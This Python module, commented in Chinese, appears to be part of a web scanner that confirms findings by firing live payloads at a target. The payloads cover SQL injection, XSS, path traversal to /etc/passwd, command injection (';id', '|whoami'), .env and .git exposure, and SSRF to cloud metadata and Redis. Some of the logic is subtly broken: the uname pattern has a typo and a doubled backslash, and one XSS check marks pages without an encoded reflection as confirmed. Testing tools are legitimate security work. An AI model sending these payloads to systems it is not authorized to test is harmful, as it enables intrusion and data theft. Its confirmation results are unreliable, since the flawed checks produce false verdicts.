# -*- coding: utf-8 -*-
"""secondary_verifier.py — 二次验证机制。

发现漏洞后自动验证是否真的可利用：
- SQL注入：发送真实payload验证响应中是否有数据泄露/错误
- XSS：检查响应中是否真的有未编码反射
- 目录遍历：检查是否真的能读取敏感文件
- 命令注入：验证命令执行回显
- 验证通过才标记为"已确认"

真实工具调用用subprocess（超时300秒），未安装工具明确提示不mock。
"""
from __future__ import annotations

import json
import re
import subprocess
import time
from typing import Any, Dict, List, Optional

try:
    import urllib.request
    import urllib.error
    _HAS_URLLIB = True
except ImportError:
    _HAS_URLLIB = False


VERIFY_PAYLOADS: Dict[str, List[Dict[str, str]]] = {
    "sql_injection": [
        {
            "name": "error_based",
            "payload": "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
            "expected_pattern": r"(?i)(XPATH syntax error|MySQL server version|SQL syntax.*MySQL)",
            "verify_method": "response_contains_pattern",
            "description": "基于报错的SQL注入 — 注入后检查MySQL报错",
        },
        {
            "name": "boolean_based",
            "payload": "' OR '1'='1",
            "expected_pattern": r"(?i)(welcome|login successful|dashboard|account)",
            "verify_method": "response_diff",
            "description": "布尔盲注 — 对比true/false响应差异",
        },
        {
            "name": "time_based",
            "payload": "' AND SLEEP(3)-- -",
            "expected_pattern": "",
            "verify_method": "timing",
            "description": "时间盲注 — 检测响应延迟>=3秒",
            "threshold_seconds": "3",
        },
        {
            "name": "union_based",
            "payload": "' UNION SELECT NULL,version(),user()-- -",
            "expected_pattern": r"(?i)(5\.\d+\.\d+|8\.\d+\.\d+|root@|mysql@)",
            "verify_method": "response_contains_pattern",
            "description": "UNION注入 — 检查响应中是否含数据库版本",
        },
    ],
    "xss_reflected": [
        {
            "name": "script_reflect",
            "payload": "<script>alert(1)</script>",
            "expected_pattern": r"<script>alert\(1\)</script>",
            "verify_method": "response_contains_raw",
            "description": "检查<script>标签是否未编码反射在HTML中",
        },
        {
            "name": "img_onerror",
            "payload": '<img src=x onerror=alert(1)>',
            "expected_pattern": r"<img src=x onerror=alert\(1\)>",
            "verify_method": "response_contains_raw",
            "description": "检查img onerror是否未编码反射",
        },
        {
            "name": "svg_onload",
            "payload": "<svg onload=alert(1)>",
            "expected_pattern": r"<svg onload=alert\(1\)>",
            "verify_method": "response_contains_raw",
            "description": "检查svg onload是否未编码反射",
        },
        {
            "name": "html_encoded_check",
            "payload": '"><script>alert(2)</script>',
            "expected_pattern": r"(?i)(&lt;script&gt;)",
            "verify_method": "response_contains_encoded",
            "description": "如果响应中是HTML编码则说明XSS被防护，非漏洞",
        },
    ],
    "path_traversal": [
        {
            "name": "etc_passwd",
            "payload": "../../../etc/passwd",
            "expected_pattern": r"root:.*:0:0:",
            "verify_method": "response_contains_pattern",
            "description": "尝试读取/etc/passwd，检查root行",
        },
        {
            "name": "win_ini",
            "payload": "..\\..\\..\\windows\\win.ini",
            "expected_pattern": r"(\[fonts\]|\[extensions\]|for 16-bit app support)",
            "verify_method": "response_contains_pattern",
            "description": "尝试读取Windows win.ini",
        },
        {
            "name": "encoded_traversal",
            "payload": "..%2f..%2f..%2fetc%2fpasswd",
            "expected_pattern": r"root:.*:0:0:",
            "verify_method": "response_contains_pattern",
            "description": "URL编码绕过目录遍历",
        },
        {
            "name": "double_encoded",
            "payload": "....//....//....//etc/passwd",
            "expected_pattern": r"root:.*:0:0:",
            "verify_method": "response_contains_pattern",
            "description": "双重绕过目录遍历",
        },
    ],
    "command_injection": [
        {
            "name": "id_echo",
            "payload": ";id",
            "expected_pattern": r"uid=\d+\(.*?\) gid=\d+",
            "verify_method": "response_contains_pattern",
            "description": "注入;id检查是否返回uid/gid",
        },
        {
            "name": "whoami",
            "payload": "|whoami",
            "expected_pattern": r"([a-zA-Z]+@|nt authority\\|desktop-)",
            "verify_method": "response_contains_pattern",
            "description": "管道符whoami检查命令执行",
        },
        {
            "name": "uname",
            "payload": "&&uname -a",
            "expected_pattern": r"(Linux|Darven|Windows).*(\\d+\.\d+\.\d+)",
            "verify_method": "response_contains_pattern",
            "description": "&&连接uname检查系统信息回显",
        },
    ],
    "sensitive_info_disclosure": [
        {
            "name": "git_config",
            "payload": "/.git/config",
            "expected_pattern": r"(\[core\]|\[remote.*origin.*\]|repositoryformatversion)",
            "verify_method": "response_contains_pattern",
            "description": "检查.git/config是否可访问",
        },
        {
            "name": "env_file",
            "payload": "/.env",
            "expected_pattern": r"(DB_PASSWORD|API_KEY|SECRET_KEY|APP_ENV=)",
            "verify_method": "response_contains_pattern",
            "description": "检查.env文件是否泄露密钥",
        },
    ],
    "ssrf": [
        {
            "name": "aws_metadata",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "expected_pattern": r"(ami-id|instance-id|security-groups|local-ipv4)",
            "verify_method": "response_contains_pattern",
            "description": "尝试访问AWS元数据服务",
        },
        {
            "name": "internal_port",
            "payload": "http://127.0.0.1:6379/",
            "expected_pattern": r"(ERR wrong|\+PONG|-ERR)",
            "verify_method": "response_contains_pattern",
            "description": "探测内部Redis端口",
        },
    ],
}


class SecondaryVerifier:
    """二次验证引擎：对扫描发现的漏洞进行真实payload验证。"""

    def __init__(self) -> None:
        self._verify_history: List[Dict[str, Any]] = []
        self._stats: Dict[str, int] = {
            "total_verified": 0,
            "confirmed": 0,
            "rejected": 0,
            "timeout": 0,
            "tool_missing": 0,
        }
        self._timeout = 300  # 秒

    def get_verify_payloads(self) -> Dict[str, List[Dict[str, str]]]:
        return {k: list(v) for k, v in VERIFY_PAYLOADS.items()}

    def verify_vulnerability(self, finding: Dict[str, Any],
                             target_url: str = "",
                             param: str = "",
                             method: str = "GET") -> Dict[str, Any]:
        """对单个漏洞发现执行二次验证。

        Args:
            finding: 漏洞发现 {type, name, url, detail, param, ...}
            target_url: 目标URL（如果finding中没有）
            param: 待注入参数名
            method: HTTP方法

        Returns:
            {verified, confidence_level, payload_used, evidence, notes, error}
        """
        vtype = (finding.get("type") or "").lower()
        url = finding.get("url") or target_url
        if not url:
            return {
                "verified": False, "confidence_level": "low",
                "payload_used": "", "evidence": "",
                "notes": "无目标URL，无法验证", "error": "no_url",
            }

        payloads = VERIFY_PAYLOADS.get(vtype, [])
        if not payloads:
            # 没有预定义验证payload的类型，标记为中置信度
            return {
                "verified": False, "confidence_level": "medium",
                "payload_used": "", "evidence": "",
                "notes": f"漏洞类型 {vtype} 无自动验证规则，标记为中置信度",
                "error": "",
            }

        best_result: Optional[Dict[str, Any]] = None
        for p in payloads:
            result = self._run_verify_payload(url, p, param, method)
            self._verify_history.append({
                "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
                "vuln_type": vtype, "payload_name": p["name"],
                "result": result,
            })
            if result.get("success"):
                best_result = result
                break  # 一个payload验证通过即可确认

        self._stats["total_verified"] += 1
        if best_result and best_result.get("success"):
            self._stats["confirmed"] += 1
            confidence = "high"
            notes = f"二次验证通过: {best_result.get('payload_name', '')}"
        else:
            self._stats["rejected"] += 1
            confidence = "low"
            notes = "二次验证未通过，可能为误报"

        return {
            "verified": bool(best_result and best_result.get("success")),
            "confidence_level": confidence,
            "payload_used": best_result.get("payload_used", "") if best_result else "",
            "evidence": best_result.get("evidence", "") if best_result else "",
            "notes": notes,
            "all_payloads_tried": [p["name"] for p in payloads],
            "error": best_result.get("error", "") if best_result else "",
        }

    def _run_verify_payload(self, url: str, payload: Dict[str, str],
                            param: str, method: str) -> Dict[str, Any]:
        """执行单个验证payload并分析响应。"""
        payload_str = payload["payload"]
        expected = payload["expected_pattern"]
        method_verify = payload["verify_method"]
        payload_name = payload["name"]

        try:
            if method_verify == "timing":
                return self._verify_timing(url, payload_str, param, method,
                                           float(payload.get("threshold_seconds", "3")))
            elif method_verify == "response_contains_raw":
                return self._verify_response_pattern(url, payload_str, param,
                                                     method, expected,
                                                     raw_match=True)
            elif method_verify == "response_contains_encoded":
                # 检测是否被编码（编码了说明非XSS）
                return self._verify_response_pattern(url, payload_str, param,
                                                     method, expected,
                                                     raw_match=True,
                                                     expect_encoded=True)
            else:
                return self._verify_response_pattern(url, payload_str, param,
                                                     method, expected)
        except Exception as e:  # noqa: BLE001
            self._stats["timeout"] += 1
            return {
                "success": False, "payload_name": payload_name,
                "payload_used": payload_str, "evidence": "",
                "error": str(e),
            }

    def _verify_response_pattern(self, url: str, payload: str, param: str,
                                 method: str, expected_pattern: str,
                                 raw_match: bool = False,
                                 expect_encoded: bool = False) -> Dict[str, Any]:
        """发送payload并检查响应是否匹配预期模式。"""
        test_url = self._inject_param(url, param, payload)
        start = time.time()
        try:
            req = urllib.request.Request(test_url, method=method.upper())
            req.add_header("User-Agent", "FP-Verifier/1.0")
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                elapsed = time.time() - start
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace") if e.fp else ""
            elapsed = time.time() - start
        except Exception as e:
            return {
                "success": False, "payload_name": "",
                "payload_used": payload, "evidence": "",
                "error": f"请求失败: {e}",
            }

        matched = bool(re.search(expected_pattern, body))
        if expect_encoded:
            # expect_encoded=True 表示期望看到编码（即非XSS）
            success = not matched  # 如果没匹配到编码模式，说明原始反射=真XSS
        else:
            success = matched

        return {
            "success": success,
            "payload_name": "",
            "payload_used": payload,
            "evidence": body[:500] if matched else "",
            "response_length": len(body),
            "response_time_ms": int(elapsed * 1000),
            "status": "matched" if matched else "not_matched",
        }

    def _verify_timing(self, url: str, payload: str, param: str,
                       method: str, threshold: float) -> Dict[str, Any]:
        """时间盲注验证：比较payload前后的响应时间差。"""
        # 先测基线时间
        base_url = self._inject_param(url, param, "1")
        try:
            start = time.time()
            req = urllib.request.Request(base_url, method=method.upper())
            req.add_header("User-Agent", "FP-Verifier/1.0")
            with urllib.request.urlopen(req, timeout=15) as resp:
                resp.read()
            baseline = time.time() - start
        except Exception:
            baseline = 1.0

        # 发送sleep payload
        test_url = self._inject_param(url, param, payload)
        try:
            start = time.time()
            req = urllib.request.Request(test_url, method=method.upper())
            req.add_header("User-Agent", "FP-Verifier/1.0")
            with urllib.request.urlopen(req, timeout=15) as resp:
                resp.read()
            elapsed = time.time() - start
        except Exception as e:
            return {
                "success": False, "payload_name": "",
                "payload_used": payload, "evidence": "",
                "error": f"时间验证请求失败: {e}",
            }

        delayed = elapsed - baseline
        success = delayed >= (threshold - 0.5)  # 容忍0.5秒误差
        return {
            "success": success,
            "payload_name": "",
            "payload_used": payload,
            "evidence": f"基线={baseline:.2f}s, 注入后={elapsed:.2f}s, 延迟={delayed:.2f}s",
            "response_time_ms": int(elapsed * 1000),
            "baseline_time_ms": int(baseline * 1000),
            "status": "delayed" if success else "no_delay",
        }

    @staticmethod
    def _inject_param(url: str, param: str, payload: str) -> str:
        """将payload注入到URL参数中。"""
        if not param:
            # 没有指定参数，追加到query string
            sep = "&" if "?" in url else "?"
            return f"{url}{sep}test={urllib.parse.quote(payload)}"
        if "?" in url:
            # 替换已有参数
            pattern = re.compile(rf"([?&]){re.escape(param)}=[^&]*")
            if pattern.search(url):
                return pattern.sub(
                    rf"\g<1>{param}={urllib.parse.quote(payload)}", url
                )
            return f"{url}&{param}={urllib.parse.quote(payload)}"
        return f"{url}?{param}={urllib.parse.quote(payload)}"

    def verify_batch(self, findings: List[Dict[str, Any]],
                     target_url: str = "") -> List[Dict[str, Any]]:
        """批量验证多个漏洞发现。"""
        results = []
        for f in findings:
            vtype = (f.get("type") or "").lower()
            param = f.get("param") or f.get("parameter") or ""
            r = self.verify_vulnerability(f, target_url, param)
            results.append({
                "finding": f,
                "verification": r,
            })
        return results

    def get_stats(self) -> Dict[str, Any]:
        total = self._stats["total_verified"]
        confirmed = self._stats["confirmed"]
        return {
            **self._stats,
            "confirm_rate": (confirmed / total if total else 0),
            "history_count": len(self._verify_history),
        }

    def get_history(self, limit: int = 50) -> List[Dict[str, Any]]:
        return list(reversed(self._verify_history[-limit:]))

    def run_nuclei_verification(self, target: str,
                                templates: str = "http/cves") -> Dict[str, Any]:
        """调用真实nuclei工具进行二次验证。

        用subprocess调用nuclei，超时300秒。未安装则明确报错。
        """
        cmd = ["nuclei", "-u", target, "-t", templates,
               "-json", "-silent", "-timeout", "30"]
        try:
            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=self._timeout, encoding="utf-8", errors="replace",
            )
            findings = []
            for line in proc.stdout.strip().split("\n"):
                if not line:
                    continue
                try:
                    item = json.loads(line)
                    findings.append(item)
                except json.JSONDecodeError:
                    continue
            return {
                "success": True,
                "tool": "nuclei",
                "target": target,
                "findings_count": len(findings),
                "findings": findings,
                "stderr_tail": proc.stderr[-500:] if proc.stderr else "",
                "returncode": proc.returncode,
            }
        except FileNotFoundError:
            self._stats["tool_missing"] += 1
            return {
                "success": False,
                "error": "nuclei未安装，请先安装: go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
            }
        except subprocess.TimeoutExpired:
            self._stats["timeout"] += 1
            return {
                "success": False,
                "error": f"nuclei验证超时({self._timeout}秒)",
            }
        except Exception as e:  # noqa: BLE001
            return {
                "success": False,
                "error": f"nuclei执行异常: {e}",
            }


# 需要导入urllib.parse
import urllib.parse  # noqa: E402


_singleton: Optional[SecondaryVerifier] = None


def get_secondary_verifier() -> SecondaryVerifier:
    global _singleton
    if _singleton is None:
        _singleton = SecondaryVerifier()
    return _singleton
